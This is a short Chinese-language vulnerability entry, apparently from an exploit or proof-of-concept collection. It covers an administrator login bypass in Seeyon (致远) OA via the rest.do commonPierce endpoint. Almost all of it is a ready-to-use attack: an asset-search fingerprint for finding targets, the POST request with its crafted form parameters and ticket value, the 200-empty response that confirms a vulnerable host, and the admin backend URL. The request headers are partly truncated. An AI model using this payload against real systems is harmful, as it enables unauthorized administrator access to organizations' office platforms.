# 致远OArest.do存在管理员登陆绕过漏洞

致远OA ｜ 其他 ｜ —
- **指纹**：`app="致远互联-OA"`
- **请求**：`POST /seeyon/uc/rest.do?method=commonPierce HTTP/1.1`

**Payload**
```
发送get请求 /seeyon/uc/rest.do?method=commonPierce
若返回200，内容为空，则说明存在漏洞
Host:
like Gecko) Chrome/91.0.4472.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 84
pierceType=pierceTask&from=1&subject=1&talkId=1&mTicket=LjgzODQxNDMxMjQzNDU4NTkyNzk=
致远的后台地址为
http://xxxx/seeyon/main.do?method=main
```
- **响应特征**：200